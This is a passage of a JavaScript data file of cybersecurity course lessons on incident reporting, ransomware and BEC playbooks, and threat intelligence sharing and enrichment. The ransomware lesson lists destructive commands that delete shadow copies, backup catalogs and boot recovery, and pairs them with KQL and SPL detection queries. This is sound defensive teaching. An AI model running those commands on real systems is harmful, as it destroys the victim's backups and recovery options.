<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 3.2 covers containment, eradication and recovery, including scope, isolation, segmentation, reimaging and compensating controls. Classic question: what is the FIRST step after confirming ransomware on one host? Usually isolate/contain it.</div>
`,
  keyTerms: [
    ["Scoping", "Determining the full extent of affected users, systems, data and timeframe"],
    ["Patient zero", "First compromised system or user in an incident"],
    ["Short-term containment", "Immediate actions to stop spread, such as isolation and account disablement"],
    ["Long-term containment", "Temporary controls maintained while clean systems are rebuilt"],
    ["Eradication", "Removing all attacker artifacts, persistence and root cause"],
    ["Eviction day", "Coordinated removal of all attacker access at once"],
    ["Recovery criteria", "Defined conditions that must be met before systems return to normal operation"],
    ["krbtgt reset", "Resetting the Kerberos ticket-granting account twice to invalidate forged tickets"]
  ],
  standards: ["NIST SP 800-61 Rev. 3", "NIST CSF 2.0 RS.MI", "NIST CSF 2.0 RC.RP"],
  labs: ["lab-ir-tabletop", "lab-siem-hunt"]
},
{
  id: "p3-m1-l3",
  module: "p3-m1",
  title: "Communication, Reporting and Lessons Learned",
  minutes: 18,
  objectives: [
    "Plan internal and external incident communications, including out-of-band channels",
    "Identify common regulatory notification timelines (SEC, GDPR, NIS2, HIPAA, CIRCIA)",
    "Write executive and technical incident reports",
    "Run a blameless post-incident review that produces tracked improvements"
  ],
  html: `
<p>Technical skill contains incidents; communication determines whether the organization survives them with its reputation and legal standing intact.</p>

<h3>Internal communication</h3>
<ul>
  <li><b>Cadence</b>: regular updates (e.g., every 2&ndash;4 hours during a critical incident) even if nothing changed.</li>
  <li><b>Audience-specific</b>: executives want impact, risk, decisions needed and timeline; engineers want IOCs and tasks.</li>
  <li><b>Out-of-band</b>: if the attacker may be reading email or chat (common in domain or Microsoft 365 compromise), move to a pre-arranged separate platform (e.g., Signal group, separate tenant, phone bridge).</li>
  <li><b>Need to know</b>: limit details to those involved, especially for insider cases.</li>
</ul>

<h3>Status update template</h3>
<pre><code>INCIDENT IR-2026-0142 | Severity: High | Status: Containment | Update #4 - 2026-10-15 16:00 UTC
Summary: Credential-theft intrusion via phishing; attacker accessed 3 workstations and 1 file server.
Impact: No evidence of exfiltration so far; file server FS02 offline for analysis (Finance shares unavailable).
Done since last update: 4 hosts isolated, 2 accounts disabled, C2 blocked, memory captured from FS02.
Next: Fleet-wide hunt for persistence; restore Finance share from 14 Oct backup (ETA 20:00 UTC).
Decisions needed: Approve forced password reset for Finance department (Legal + HR informed).
Next update: 20:00 UTC</code></pre>

<h3>External communication and notification</h3>
<p>Parties: regulators, customers, partners, law enforcement (FBI/IC3, CISA, national CERTs), cyber insurer (often must be notified quickly to preserve coverage), media. Legal counsel and communications/PR lead these. Common timelines to know:</p>
<table>
  <tr><th>Regime</th><th>Requirement (summary)</th></tr>
  <tr><td><b>SEC</b> (US public companies, Form 8-K Item 1.05)</td><td>Disclose a <i>material</i> cybersecurity incident within 4 business days of determining materiality</td></tr>
  <tr><td><b>GDPR</b> (EU/UK)</td><td>Notify the supervisory authority within 72 hours of becoming aware of a personal data breach (unless unlikely to result in risk); notify individuals without undue delay if high risk</td></tr>
  <tr><td><b>NIS2</b> (EU essential/important entities)</td><td>Early warning within 24 hours, incident notification within 72 hours, final report within one month</td></tr>
  <tr><td><b>DORA</b> (EU financial entities)</td><td>Staged reporting of major ICT incidents, with the initial notification within hours of classification</td></tr>
  <tr><td><b>HIPAA</b> (US health)</td><td>Notify individuals without unreasonable delay and no later than 60 days after discovery; HHS and possibly media for 500+ individuals</td></tr>
  <tr><td><b>CIRCIA</b> (US critical infrastructure)</td><td>When the CISA final rule takes effect: 72 hours for covered incidents, 24 hours for ransom payments</td></tr>
  <tr><td><b>PCI DSS</b></td><td>Notify card brands/acquirer per their rules when cardholder data is involved</td></tr>
</table>
<p>US states also have their own breach notification laws, and contracts often impose shorter customer notification windows. Analysts do not decide notification &mdash; but your timeline and evidence are what counsel uses to decide, so precision matters.</p>

<h3>Reports</h3>
<ul>
  <li><b>Executive summary</b> (1 page): what happened, business impact, root cause in plain language, current status, key recommendations with owners.</li>
  <li><b>Technical report</b>: detailed timeline, scope (hosts, accounts, data), attack narrative mapped to ATT&amp;CK, IOCs, evidence references, containment/eradication actions, detection gaps.</li>
  <li><b>Appendices</b>: full IOC list (with TLP marking), queries used, forensic findings.</li>
</ul>

<h3>Lessons learned</h3>
<p>Hold the review within about two weeks, while memory is fresh. Make it <b>blameless</b>: focus on systems and process, not individuals &mdash; people hide mistakes when they fear punishment. Questions:</p>
<ol>
  <li>What happened, and when did we know?</li>
  <li>What went well?</li>
  <li>What would have detected this earlier? (Missing logs, missing detections, ignored alerts.)</li>
  <li>What slowed containment? (Approvals, access, tooling, unclear roles.)</li>
  <li>What will we change? Each action gets an <b>owner and due date</b> and is tracked to completion.</li>
</ol>
<p>Typical outputs: new detections (often a Sigma rule from the observed TTP), playbook updates, logging changes, hardening projects, training. Measure: MTTD and MTTR for this incident versus your targets. Under NIST Rev. 3 these improvements feed the <b>Identify &ndash; Improvement (ID.IM)</b> category so they inform risk management, not just the SOC.</p>

<div class="callout tip"><b>Tip:</b> Write every ticket note and timeline entry as if it will be read aloud in court or by a regulator. Facts, times, sources. Avoid speculation ("the attacker is probably Russian") and emotional language.</div>

<div class="callout real"><b>On the job:</b> Cyber insurance policies commonly require you to use their panel of IR firms and counsel. Know your insurer's hotline before an incident &mdash; engaging a non-panel vendor can jeopardize coverage.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 Domain 4 (Reporting and Communication, 17%) covers incident reporting, stakeholder communication, lessons learned, root cause analysis and metrics. Domain 3.3 covers post-incident activity. Expect questions about who should communicate with media (public relations/legal, not analysts).</div>
`,
  keyTerms: [
    ["Out-of-band communication", "Separate channel used when primary communication systems may be compromised"],
    ["Material incident", "Incident significant enough to influence investors, triggering SEC disclosure"],
    ["72-hour rule", "GDPR deadline for notifying the supervisory authority of a personal data breach"],
    ["Executive summary", "Short non-technical report of impact, cause, status and recommendations"],
    ["Root cause analysis", "Identifying the underlying reason an incident occurred"],
    ["Blameless review", "Post-incident review focused on process and systems rather than individual fault"],
    ["Lessons learned", "Final IR activity producing tracked improvements"]
  ],
  standards: ["NIST SP 800-61 Rev. 3", "GDPR Art. 33", "SEC Form 8-K Item 1.05", "NIS2 Directive Art. 23"],
  labs: ["lab-ir-tabletop"]
},
{
  id: "p3-m1-l4",
  module: "p3-m1",
  title: "Playbooks in Action: Ransomware and BEC",
  minutes: 22,
  objectives: [
    "Walk through a ransomware response playbook from first alert to recovery",
    "Recognize ransomware precursors that allow intervention before encryption",
    "Walk through a business email compromise playbook",
    "Identify the decisions in each playbook that require management or legal approval"
  ],
  html: `
<p>Playbooks turn the abstract lifecycle into concrete steps for specific scenarios. Ransomware and BEC are the two incident types most SOC analysts handle, so we walk through each.</p>

<h3>Ransomware: know the precursors</h3>
<p>Modern ransomware is human-operated and usually involves days of hands-on activity before encryption &mdash; though the time from initial access to encryption has shrunk sharply in recent years, sometimes to under 24 hours. Precursors to alert on:</p>
<ul>
  <li>Initial access via exploited edge devices (VPN, firewalls, file-transfer appliances), stolen VPN credentials without MFA, or loader malware from phishing/SEO poisoning.</li>
  <li>Discovery tools: AdFind, SharpHound/BloodHound, Advanced IP Scanner, <code>nltest</code>, <code>net group "domain admins"</code>.</li>
  <li>Credential theft (LSASS access, NTDS.dit extraction) and new RMM tools.</li>
  <li>Defense evasion: security tools disabled, Defender exclusions added, BYOVD drivers loaded.</li>
  <li>Staging and exfiltration: 7-Zip/WinRAR archives, rclone, large uploads (double extortion).</li>
  <li>Final-stage: <code>vssadmin delete shadows /all /quiet</code>, <code>wbadmin delete catalog</code>, <code>bcdedit /set {default} recoveryenabled No</code>, mass GPO or PsExec deployment, ESXi hosts targeted to encrypt VMs.</li>
</ul>
<pre><code>KQL - inhibit system recovery commands:
DeviceProcessEvents
| where Timestamp &gt; ago(1d)
| where (FileName =~ "vssadmin.exe" and ProcessCommandLine has_all ("delete","shadows"))
     or (FileName =~ "wmic.exe" and ProcessCommandLine has_all ("shadowcopy","delete"))
     or (FileName =~ "bcdedit.exe" and ProcessCommandLine has "recoveryenabled")
     or (FileName =~ "wbadmin.exe" and ProcessCommandLine has_all ("delete","catalog"))

SPL equivalent:
index=sysmon EventCode=1 earliest=-24h
  ((Image="*\\vssadmin.exe" CommandLine="*delete*shadows*")
   OR (Image="*\\wmic.exe" CommandLine="*shadowcopy*delete*")
   OR (Image="*\\bcdedit.exe" CommandLine="*recoveryenabled*")
   OR (Image="*\\wbadmin.exe" CommandLine="*delete*catalog*"))
| table _time host User ParentImage CommandLine</code></pre>

<h3>Ransomware playbook</h3>
<ol>
  <li><b>Detect and declare</b>: confirm encryption or precursors; declare a critical incident; activate the IR team and incident commander.</li>
  <li><b>Contain fast</b>: isolate affected hosts via EDR; disable accounts used by the attacker; block lateral movement paths (SMB/RDP between segments); consider disconnecting internet egress or affected sites. Protect backups immediately &mdash; take them offline if they are reachable.</li>
  <li><b>Preserve evidence</b>: memory from key systems if possible, ransom note, encrypted file samples, logs. Do not wipe yet.</li>
  <li><b>Engage</b> legal counsel, cyber insurer, external IR retainer, and law enforcement (FBI/CISA in the US). Check <b>No More Ransom</b> for available decryptors.</li>
  <li><b>Scope</b>: patient zero, access vector, all compromised accounts and hosts, and whether data was exfiltrated (check leak sites with your threat intel team).</li>
  <li><b>Eradicate</b>: rebuild from known-good images; reset all privileged credentials and krbtgt (twice); remove persistence; patch the entry point.</li>
  <li><b>Recover</b>: restore from clean, verified backups in priority order; monitor intensively.</li>
  <li><b>Lessons learned</b>, notifications, and report.</li>
</ol>
<div class="callout warn"><b>Warning:</b> Paying a ransom is a business and legal decision made by executives with counsel &mdash; never by the SOC. In the US, paying a sanctioned entity can violate OFAC regulations, and paying does not guarantee working decryption or deletion of stolen data.</div>

<h3>BEC playbook</h3>
<ol>
  <li><b>Trigger</b>: user reports a suspicious payment request, a vendor reports changed bank details, or an alert fires (suspicious inbox rule, risky sign-in, impossible travel).</li>
  <li><b>Contain the identity</b>: reset password, revoke sessions and refresh tokens, remove attacker MFA methods, block sign-in temporarily if needed.</li>
  <li><b>Investigate the mailbox</b> using the unified audit log:
<pre><code>KQL (Sentinel OfficeActivity):
OfficeActivity
| where TimeGenerated &gt; ago(30d) and UserId =~ "m.lee@contoso.com"
| where Operation in ("New-InboxRule","Set-InboxRule","Set-Mailbox","UpdateInboxRules","Add-MailboxPermission","Consent to application.")
| project TimeGenerated, Operation, ClientIP, Parameters</code></pre>
    Look for forwarding to external addresses, rules that delete or move messages, delegated access, OAuth app consents, and <code>MailItemsAccessed</code> (which messages the attacker read).</li>
  <li><b>Scope</b>: sign-in logs for attacker IPs across <i>all</i> users; emails sent by the compromised account (internal phishing, fraudulent invoices).</li>
  <li><b>Financial response</b>: contact finance and the bank immediately &mdash; funds recall is time-critical (hours to days). File with the FBI IC3, whose Recovery Asset Team can help freeze domestic transfers.</li>
  <li><b>Notify</b> affected external parties (customers who received fraudulent invoices) via legal/communications.</li>
  <li><b>Harden</b>: phishing-resistant MFA, Conditional Access, block external auto-forwarding, alert on inbox rule creation, out-of-band verification for payment changes.</li>
</ol>

<div class="callout tip"><b>Tip:</b> In BEC, the attacker often had access for days before anyone noticed. Always look back at least 30 days in sign-in and audit logs, and check whether the attacker used the mailbox to phish others internally.</div>

<div class="callout real"><b>On the job:</b> Playbooks are living documents. After each incident, update the playbook with the queries you actually used and the approvals you actually needed. A playbook full of copy-paste-ready queries saves precious minutes at 3 a.m.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 Domain 3 scenarios frequently involve ransomware and compromised email accounts; know the order (contain before eradicate, preserve evidence, verify backups). BTL1's incident response domain uses similar playbook-style questions.</div>
`,
  keyTerms: [
    ["Human-operated ransomware", "Ransomware deployed by attackers after hands-on network compromise"],
    ["Double extortion", "Encrypting data and threatening to leak stolen copies"],
    ["Inhibit System Recovery", "Deleting shadow copies and backups before encryption (T1490)"],
    ["Immutable backup", "Backup that cannot be modified or deleted for a retention period"],
    ["Unified audit log", "Microsoft 365 log of user and admin activity across services"],
    ["Inbox rule abuse", "Attacker-created mail rules that hide or forward messages"],
    ["Funds recall", "Urgent bank process to reverse a fraudulent transfer"],
    ["OFAC", "US Treasury office whose sanctions can prohibit ransom payments to certain actors"]
  ],
  standards: ["NIST SP 800-61 Rev. 3", "MITRE ATT&CK T1486", "MITRE ATT&CK T1490", "MITRE ATT&CK T1114.003"],
  labs: ["lab-ir-tabletop", "lab-phishing"]
}
);

/* ===================== p3-m2 Cyber Threat Intelligence ===================== */
CP.lessons.push(
{
  id: "p3-m2-l1",
  module: "p3-m2",
  title: "The Threat Intelligence Lifecycle and Intelligence Types",
  minutes: 18,
  objectives: [
    "Define cyber threat intelligence and distinguish it from raw data and information",
    "Describe the six phases of the intelligence lifecycle",
    "Differentiate strategic, operational, tactical and technical intelligence and their audiences",
    "Write priority intelligence requirements (PIRs)"
  ],
  html: `
<p><b>Cyber threat intelligence (CTI)</b> is evidence-based knowledge about adversaries &mdash; their capabilities, infrastructure, intent and behavior &mdash; that has been analyzed to support a decision. The key word is <i>decision</i>. A list of 50,000 IP addresses is <b>data</b>; knowing that a ransomware affiliate is exploiting the VPN appliance you run is <b>intelligence</b>, because it tells you to patch tonight.</p>

<h3>Data, information, intelligence</h3>
<table>
  <tr><th>Level</th><th>Example</th></tr>
  <tr><td>Data</td><td>IP 198.51.100.40 seen in a feed</td></tr>
  <tr><td>Information</td><td>198.51.100.40 hosts a Cobalt Strike team server, first seen 3 days ago</td></tr>
  <tr><td>Intelligence</td><td>That server belongs to an affiliate currently targeting regional healthcare via exploited edge devices; we run that product and two of our hosts contacted it &mdash; recommend immediate hunt and patch</td></tr>
</table>

<h3>The intelligence lifecycle</h3>
<ol>
  <li><b>Direction (Planning and Requirements)</b> &mdash; stakeholders define what they need to know. Without requirements, CTI teams drown in feeds.</li>
  <li><b>Collection</b> &mdash; gather from internal telemetry (incidents, SIEM, EDR, phishing reports), OSINT (vendor blogs, CISA advisories, social media, code repositories), commercial feeds, ISACs, dark-web monitoring, malware sandboxes.</li>
  <li><b>Processing</b> &mdash; normalize, deduplicate, translate, decode, structure (e.g., into STIX) and store in a TIP.</li>
  <li><b>Analysis</b> &mdash; turn information into judgments: who, what, why, so what. Use structured analytic techniques (Analysis of Competing Hypotheses, key assumptions check) to counter bias.</li>
  <li><b>Dissemination</b> &mdash; deliver the right product to the right audience in the right format and at the right classification (TLP).</li>
  <li><b>Feedback</b> &mdash; did it help? Adjust requirements and collection.</li>
</ol>

<h3>Types and audiences</h3>
<table>
  <tr><th>Type</th><th>Question</th><th>Audience</th><th>Example product</th></tr>
  <tr><td><b>Strategic</b></td><td>Who threatens us and why? What are the trends?</td><td>Executives, board, risk</td><td>Annual threat landscape brief for the healthcare sector</td></tr>
  <tr><td><b>Operational</b></td><td>What campaign is coming and how will it unfold?</td><td>SOC/IR leadership, hunters</td><td>Report on an active campaign exploiting a specific VPN CVE, with timeline</td></tr>
  <tr><td><b>Tactical</b></td><td>What TTPs do they use?</td><td>Detection engineers, SOC</td><td>ATT&amp;CK-mapped TTP profile and detection recommendations</td></tr>
  <tr><td><b>Technical</b></td><td>What specific indicators?</td><td>SIEM/EDR/firewalls (often machine-to-machine)</td><td>Hash, IP, domain, URL lists with context and expiry</td></tr>
</table>
<p>Some sources merge tactical and technical; CySA+ and many vendors use the four-type split above.</p>

<h3>Priority Intelligence Requirements</h3>
<p>PIRs are the questions leadership most needs answered. Good PIRs are specific, tied to business risk, and answerable:</p>
<ul>
  <li>"Which threat actors are actively targeting US regional hospitals, and what initial access methods are they using this quarter?"</li>
  <li>"Are any vulnerabilities in our internet-facing products being exploited in the wild (CISA KEV, vendor reports)?"</li>
  <li>"Are our credentials, data or brand appearing on criminal marketplaces or leak sites?"</li>
</ul>
<p>Each PIR breaks down into specific information requirements and collection tasks.</p>

<h3>Threat actor categories</h3>
<ul>
  <li><b>Nation-state / APT</b>: espionage, pre-positioning in critical infrastructure (e.g., Volt Typhoon), sometimes destruction.</li>
  <li><b>Cybercriminal</b>: ransomware-as-a-service operators and affiliates, initial access brokers, infostealer operators, BEC groups.</li>
  <li><b>Hacktivists</b>: DDoS, defacement, leaks for ideological reasons; some are state-aligned fronts.</li>
  <li><b>Insiders</b>: malicious or negligent employees and contractors.</li>
</ul>
<p>Vendors name actors differently (Microsoft uses weather themes such as "Midnight Blizzard"; CrowdStrike uses animals such as "Cozy Bear"; Mandiant uses APT/FIN/UNC numbers). MITRE ATT&amp;CK group pages list associated names so you can reconcile reports.</p>

<h3>Analytic confidence and language</h3>
<p>Intelligence judgments carry uncertainty. Use consistent estimative language (e.g., "likely" = 55&ndash;80%, "almost certainly" = 95%+, following ICD 203-style standards) and state confidence (low/moderate/high) based on source reliability and corroboration. Never present a single-source claim as fact.</p>

<div class="callout tip"><b>Tip:</b> Free, high-quality sources to read every week: CISA advisories and the Known Exploited Vulnerabilities (KEV) catalog, vendor threat research blogs (Microsoft, Google/Mandiant, Unit 42, Cisco Talos, Red Canary, Huntress, The DFIR Report), and your sector ISAC's bulletins.</div>

<div class="callout real"><b>On the job:</b> In most SOCs, Tier 1/2 analysts are CTI <i>consumers and producers</i>: you enrich alerts with intel, and every incident you investigate produces internal intelligence (IOCs, TTPs) that is often more relevant than any external feed.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.4 covers threat intelligence and threat hunting concepts: intelligence types, sources (open/closed/proprietary), confidence levels (timeliness, relevancy, accuracy), information sharing communities and threat actor types. BTL1 covers the intelligence lifecycle and actor types.</div>
`,
  keyTerms: [
    ["Cyber threat intelligence", "Analyzed, evidence-based knowledge about threats that supports decisions"],
    ["Intelligence lifecycle", "Direction, collection, processing, analysis, dissemination, feedback"],
    ["Strategic intelligence", "High-level trends and risks for executive decision-making"],
    ["Operational intelligence", "Details about specific campaigns and their likely progression"],
    ["Tactical intelligence", "Adversary TTPs used to guide detection and defense"],
    ["PIR", "Priority Intelligence Requirement: key question stakeholders need answered"],
    ["Estimative language", "Standardized probability words expressing analytic uncertainty"],
    ["Initial access broker", "Criminal who sells access to compromised networks to other actors"]
  ],
  standards: ["ICD 203", "CISA KEV Catalog"],
  labs: ["lab-ioc-triage"]
},
{
  id: "p3-m2-l2",
  module: "p3-m2",
  title: "Sharing Intelligence: STIX 2.1, TAXII, TLP 2.0 and MISP",
  minutes: 20,
  objectives: [
    "Describe STIX 2.1 domain objects, relationship objects and patterns",
    "Explain how TAXII 2.1 collections distribute intelligence",
    "Apply TLP 2.0 markings correctly (CLEAR, GREEN, AMBER, AMBER+STRICT, RED)",
    "Describe the role of MISP, OpenCTI and ISACs in intelligence sharing"
  ],
  html: `
<p>Intelligence is most valuable when shared quickly and in a form machines can act on. A set of open standards, maintained by OASIS and FIRST, makes that possible.</p>

<h3>STIX 2.1: the language</h3>
<p><b>Structured Threat Information Expression (STIX) 2.1</b> is a JSON-based standard for describing threat intelligence. Its building blocks:</p>
<ul>
  <li><b>STIX Domain Objects (SDOs)</b>: attack-pattern, campaign, course-of-action, grouping, identity, indicator, infrastructure, intrusion-set, location, malware, malware-analysis, note, observed-data, opinion, report, threat-actor, tool, vulnerability.</li>
  <li><b>STIX Cyber-observable Objects (SCOs)</b>: ipv4-addr, domain-name, url, file, email-message, process, network-traffic, user-account and more.</li>
  <li><b>STIX Relationship Objects (SROs)</b>: <code>relationship</code> (e.g., indicator <i>indicates</i> malware; threat-actor <i>uses</i> attack-pattern) and <code>sighting</code> (we saw this indicator here).</li>
  <li><b>Patterns</b>: the detection logic inside an indicator.</li>
</ul>
<pre><code>{
  "type": "bundle",
  "id": "bundle--5d0092c5-5f74-4287-9642-33f4c354e56d",
  "objects": [
    {
      "type": "indicator",
      "spec_version": "2.1",
      "id": "indicator--8e2e2d2b-17d4-4cbf-938f-98ee46b3cd3f",
      "created": "2026-10-14T15:00:00.000Z",
      "modified": "2026-10-14T15:00:00.000Z",
      "name": "Loader C2 domain",
      "indicator_types": ["malicious-activity"],
      "pattern": "[domain-name:value = 'updcheck-cdn.example']",
      "pattern_type": "stix",
      "valid_from": "2026-10-14T15:00:00Z",
      "valid_until": "2026-11-14T15:00:00Z",
      "confidence": 80,
      "object_marking_refs": ["marking-definition--bab4a63c-aed9-4cf5-a766-dfca5abac2bb"]
    },
    {
      "type": "malware",
      "spec_version": "2.1",
      "id": "malware--31b940d4-6f7f-459a-80ea-9c1f17b5891b",
      "created": "2026-10-14T15:00:00.000Z",
      "modified": "2026-10-14T15:00:00.000Z",
      "name": "ExampleLoader",
      "is_family": true,
      "malware_types": ["downloader"]
    },
    {
      "type": "relationship",
      "spec_version": "2.1",
      "id": "relationship--44298a74-ba52-4f0c-87a3-1824e67d7fad",
      "created": "2026-10-14T15:00:00.000Z",
      "modified": "2026-10-14T15:00:00.000Z",
      "relationship_type": "indicates",
      "source_ref": "indicator--8e2e2d2b-17d4-4cbf-938f-98ee46b3cd3f",
      "target_ref": "malware--31b940d4-6f7f-459a-80ea-9c1f17b5891b"
    }
  ]
}</code></pre>
<p>Notice <code>valid_until</code> (indicators age out), <code>confidence</code> (0&ndash;100), and the marking reference pointing to a TLP marking definition. STIX patterns can be complex: <code>[file:hashes.'SHA-256' = '...'] OR [network-traffic:dst_ref.value = '198.51.100.40' AND network-traffic:dst_port = 443]</code>. The <code>pattern_type</code> field also allows Sigma, YARA, Snort and Suricata patterns to be carried inside STIX indicators.</p>

<h3>TAXII 2.1: the transport</h3>
<p><b>Trusted Automated Exchange of Intelligence Information (TAXII) 2.1</b> is a RESTful HTTPS protocol for exchanging STIX. A TAXII server exposes <b>API roots</b> containing <b>collections</b>; clients GET objects from or POST objects to collections (with <code>added_after</code> filters for incremental polling). Microsoft Sentinel's "Threat Intelligence &ndash; TAXII" connector, Splunk, MISP and OpenCTI all speak TAXII. Note that STIX/TAXII 1.x (XML) is obsolete.</p>

<h3>TLP 2.0: sharing permissions</h3>
<p>The <b>Traffic Light Protocol</b>, maintained by FIRST, tells recipients how far they may share information. Version 2.0 (August 2022) is current:</p>
<table>
  <tr><th>Label</th><th>Sharing allowed</th></tr>
  <tr><td><b>TLP:RED</b></td><td>For the eyes and ears of individual recipients only; no further disclosure (e.g., spoken in a meeting)</td></tr>
  <tr><td><b>TLP:AMBER+STRICT</b></td><td>Recipient's organization only, on a need-to-know basis</td></tr>
  <tr><td><b>TLP:AMBER</b></td><td>Recipient's organization <i>and its clients</i>, on a need-to-know basis</td></tr>
  <tr><td><b>TLP:GREEN</b></td><td>Within the recipient's community (e.g., sector peers), but not publicly</td></tr>
  <tr><td><b>TLP:CLEAR</b></td><td>No restrictions; public (replaced TLP:WHITE in 2.0)</td></tr>
</table>
<p>Write labels exactly as <code>TLP:AMBER+STRICT</code> (uppercase, no space), placed in the header and footer of documents or the subject line of emails. TLP is about <i>sharing</i>, not classification, and the source sets it. If you need to share beyond the label, ask the source.</p>

<div class="callout warn"><b>Warning:</b> Violating TLP destroys trust and can get your organization removed from sharing communities. Never paste TLP:AMBER or RED reports into public tools, public chats or AI assistants not approved for that data.</div>

<h3>MISP, OpenCTI and threat intelligence platforms</h3>
<p>A <b>Threat Intelligence Platform (TIP)</b> collects, deduplicates, scores, correlates and distributes intel. <b>MISP</b> (open source, originally from CIRCL Luxembourg) organizes data into <b>events</b> containing <b>attributes</b> (IOCs) and <b>objects</b>, with <b>tags</b> and <b>galaxies</b> (threat actors, ATT&amp;CK techniques), sharing groups, warning lists (to catch false positives like Google DNS or Alexa top sites) and correlation across events. It exports to STIX, Suricata, Snort, CSV and SIEM formats. <b>OpenCTI</b> is a STIX-native knowledge graph platform; commercial TIPs include ThreatConnect, Anomali, Recorded Future and Google Threat Intelligence.</p>

<h3>Sharing communities</h3>
<ul>
  <li><b>ISACs/ISAOs</b>: sector communities (FS-ISAC, Health-ISAC, MS-ISAC for US state/local government, E-ISAC, Auto-ISAC).</li>
  <li><b>Government</b>: CISA (Automated Indicator Sharing, AIS, uses STIX/TAXII), national CERTs/CSIRTs, NCSC.</li>
  <li><b>Trust groups</b>: invitation-only analyst communities sharing at TLP:AMBER/RED.</li>
</ul>

<div class="callout real"><b>On the job:</b> Before pushing a community feed into blocking controls, check its false-positive history and use warning lists. Many outages have been caused by a feed that briefly listed a major CDN or cloud IP range as malicious.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.4 covers information sharing (ISACs), STIX/TAXII and TLP. Know that STIX is the format, TAXII is the transport, and TLP:CLEAR replaced TLP:WHITE.</div>
`,
  keyTerms: [
    ["STIX 2.1", "OASIS JSON standard for representing threat intelligence objects and relationships"],
    ["SDO", "STIX Domain Object such as indicator, malware, threat-actor or attack-pattern"],
    ["STIX pattern", "Indicator detection expression, e.g. [domain-name:value = 'x']"],
    ["TAXII 2.1", "HTTPS/REST protocol for exchanging STIX via collections"],
    ["TLP 2.0", "FIRST Traffic Light Protocol: RED, AMBER+STRICT, AMBER, GREEN, CLEAR"],
    ["MISP", "Open-source threat intelligence sharing platform using events, attributes and galaxies"],
    ["TIP", "Threat Intelligence Platform for aggregating, scoring and distributing intel"],
    ["ISAC", "Information Sharing and Analysis Center for a specific sector"]
  ],
  standards: ["OASIS STIX 2.1", "OASIS TAXII 2.1", "FIRST TLP 2.0"],
  labs: ["lab-ioc-triage"]
},
{
  id: "p3-m2-l3",
  module: "p3-m2",
  title: "IOC Enrichment, Scoring and Operationalizing Intel",
  minutes: 20,
  objectives: [
    "Enrich IPs, domains, URLs and hashes using common reputation and OSINT services",
    "Assess indicator quality using source reliability, confidence and age",
    "Avoid common enrichment pitfalls (shared infrastructure, sinkholes, OPSEC)",
    "Operationalize intelligence into detections, blocks and hunts"
  ],
  html: `
<p>Every SOC shift involves looking up indicators. Doing it well means knowing what each source tells you, how much to trust it, and when an indicator is too old or too shared to act on.</p>

<h3>Enrichment by indicator type</h3>
<table>
  <tr><th>Type</th><th>Questions</th><th>Common sources</th></tr>
  <tr><td><b>IP address</b></td><td>Who owns it (ASN), where, is it a VPN/Tor/cloud/residential proxy, abuse reports, open ports, what domains resolve to it</td><td>AbuseIPDB, GreyNoise, Shodan/Censys, IPinfo, VirusTotal, Spur (proxy/VPN), Tor exit lists</td></tr>
  <tr><td><b>Domain</b></td><td>Registration date and registrar (RDAP/WHOIS), DNS history, certificates, categorization, look-alike of a brand?</td><td>VirusTotal, passive DNS (e.g., DomainTools, SecurityTrails, Validin), crt.sh, URLhaus</td></tr>
  <tr><td><b>URL</b></td><td>What does the page do, redirects, screenshot, kit fingerprint</td><td>urlscan.io, URLhaus, Google Safe Browsing, sandbox</td></tr>
  <tr><td><b>File hash</b></td><td>Known malicious? Family? First seen? Behavior?</td><td>VirusTotal, MalwareBazaar, Hybrid Analysis, Any.Run, vendor TI</td></tr>
  <tr><td><b>Email address/sender</b></td><td>Breach data, prior campaigns, domain age</td><td>Internal email logs, TIP history</td></tr>
</table>

<h3>Interpreting results</h3>
<pre><code>IP: 185.220.101.47
ASN: AS208294 (Tor exit relay operator)    AbuseIPDB: 100% confidence, 4,812 reports
GreyNoise: "benign? no - malicious scanner, tags: SSH bruteforcer, Tor exit"
Verdict: Tor exit - expected to be noisy; blocking Tor exits is a policy decision.
         Key point: a SUCCESSFUL logon from it is the real issue, not the IP itself.

Hash: 3f1a...e9b2   VirusTotal 0/72, first submitted 2 hours ago (by us?)
Verdict: Unknown is not clean. New/unique hash + suspicious behavior = sandbox and investigate.</code></pre>
<ul>
  <li><b>Zero detections does not mean benign</b>: new, targeted or recompiled samples will be unknown.</li>
  <li><b>Shared infrastructure</b>: an IP hosting 3,000 domains (CDN, shared hosting, cloud) may be "malicious" in a feed because of one site. Blocking it causes collateral damage.</li>
  <li><b>Sinkholes</b>: domains taken over by researchers or law enforcement resolve to sinkhole IPs. Traffic to a sinkhole means a host is still infected, but the C2 is not live.</li>
  <li><b>GreyNoise "noise"</b>: IPs mass-scanning the internet are usually not targeting <i>you</i>; they help you deprioritize, not ignore.</li>
  <li><b>Age</b>: IPs and domains change hands. An IOC from 18 months ago may now belong to a legitimate business.</li>
</ul>

<h3>Rating sources and information</h3>
<p>The <b>Admiralty Code</b> (NATO system) rates source reliability A&ndash;F and information credibility 1&ndash;6:</p>
<table>
  <tr><th>Reliability</th><th>Credibility</th></tr>
  <tr><td>A &ndash; Completely reliable</td><td>1 &ndash; Confirmed by other sources</td></tr>
  <tr><td>B &ndash; Usually reliable</td><td>2 &ndash; Probably true</td></tr>
  <tr><td>C &ndash; Fairly reliable</td><td>3 &ndash; Possibly true</td></tr>
  <tr><td>D &ndash; Not usually reliable</td><td>4 &ndash; Doubtful</td></tr>
  <tr><td>E &ndash; Unreliable</td><td>5 &ndash; Improbable</td></tr>
  <tr><td>F &ndash; Reliability cannot be judged</td><td>6 &ndash; Truth cannot be judged</td></tr>
</table>
<p>"B2" = usually reliable source, probably true. MISP supports Admiralty tags natively. CySA+ frames intel quality as <b>timeliness, relevancy, accuracy</b> and confidence.</p>

<div class="callout warn"><b>Warning:</b> Enrichment has OPSEC risk. Directly visiting an attacker's domain or IP from your corporate network reveals that you are investigating. Uploading a targeted sample to a public sandbox can alert the actor (they monitor VirusTotal for their own samples). Use passive sources, private submissions, and isolated analysis infrastructure.</div>

<h3>Operationalizing intelligence</h3>
<ol>
  <li><b>Retro-hunt</b>: search historical logs for the indicators (has this already happened here?).
<pre><code>KQL (Sentinel threat intelligence matching):
let iocs = ThreatIntelIndicators
  | where IsActive and ValidUntil &gt; now()
  | where ObservableKey == "domain-name:value"
  | project Domain = ObservableValue, Confidence;
DnsEvents
| where TimeGenerated &gt; ago(30d)
